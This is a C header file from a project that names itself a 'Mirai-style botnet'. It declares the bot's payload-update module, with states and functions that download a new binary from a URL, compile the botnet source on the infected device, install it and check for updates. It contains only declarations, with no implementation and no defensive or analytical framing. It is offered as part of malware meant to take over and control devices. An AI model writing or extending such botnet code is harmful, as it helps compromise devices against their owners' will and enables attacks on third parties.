/*
 * notnet - Modern Mirai-Style Botnet
 * payload.h - Binary payload download and on-target compilation
 */
#ifndef NOTNET_PAYLOAD_H
#define NOTNET_PAYLOAD_H

#include "protocol.h"

/* Payload states */
#define PAYLOAD_IDLE       0
#define PAYLOAD_DOWNLOAD   1
#define PAYLOAD_VERIFY     2
#define PAYLOAD_COMPILE    3
#define PAYLOAD_INSTALLED  4

/* ── Payload State ──────────────────────────────────────────── */
typedef struct {
    uint8_t state;
    char new_bin[PAYLOAD_MAX_SIZE];
    int new_bin_len;
    char install_path[256];
    time_t last_update;
    uint8_t arch[16];
} notnet_payload_t;

/* ── Functions ──────────────────────────────────────────────── */
int payload_update(notnet_bot_t *bot, const char *url, const char *dest);
/* Compile the notnet source bundle on-target.
 * source is a local path to the source tarball (downloaded and
 * SHA-256-verified by payload_update's fallback path); dest is the
 * output binary. Returns 0 on success, -1 on failure. */
int payload_compile(notnet_bot_t *bot, const char *source, const char *dest);
int payload_install(notnet_bot_t *bot, const char *bin_path);
int payload_check_update(notnet_bot_t *bot);
const char *payload_get_arch(void);

#endif /* NOTNET_PAYLOAD_H */
